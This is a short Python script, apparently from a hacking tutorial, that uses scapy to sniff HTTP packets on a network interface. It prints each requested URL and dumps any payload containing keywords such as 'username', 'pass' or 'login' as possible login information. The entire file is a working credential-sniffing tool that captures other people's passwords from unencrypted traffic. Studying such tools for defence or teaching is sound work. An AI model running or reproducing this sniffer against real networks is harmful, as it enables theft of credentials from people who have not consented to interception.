'''
script intercepting packets, filtering for packets of interest and password/username extraction
'''

#import liraries and modules

import scapy.all as scapy
#from scapy.layers import http --> deprecated
from scapy_http import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=packet_processing) #prn - function to pass the sniffed packets to

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        data = packet[scapy.Raw].load.decode() # returns byte object with data or raw packet load (=binary text)
        keywords = ["uname", "username", "user", "login", "password", "pass", "pw"]
        for word in keywords:
            if word in data:
                return data

def packet_processing(packet):
    if packet.haslayer(http.HTTPRequest): #check if packet has an http-layer - NOTE: http is the only layer scapy.all does not provide --> additionally imported from scapy.layers
        url = get_url(packet)# return byte objects ,that need to be converted to string objetc for printing by using str() or .decode()
        print(f"[+] HTTP Request >>>  {url.decode()}") # .str() could also be used instead of .decode()
        #print(packet[http.HTTPRequest].show()) # use .show() or .summary() on packets, for troublshooting and to see output

        login_info = get_login_info(packet)
        if login_info:
            print(f"\n\n[+] Possible login information >>>  {login_info} \n\n") # no convresion to string necessary, as a string is already returned from get_login_info()



if __name__ == "__main__":
    try:
        while True:
            sniff("eth0")

    except KeyboardInterrupt:
        print("\n[+] Shutting down program... Please wait\n")
        exit()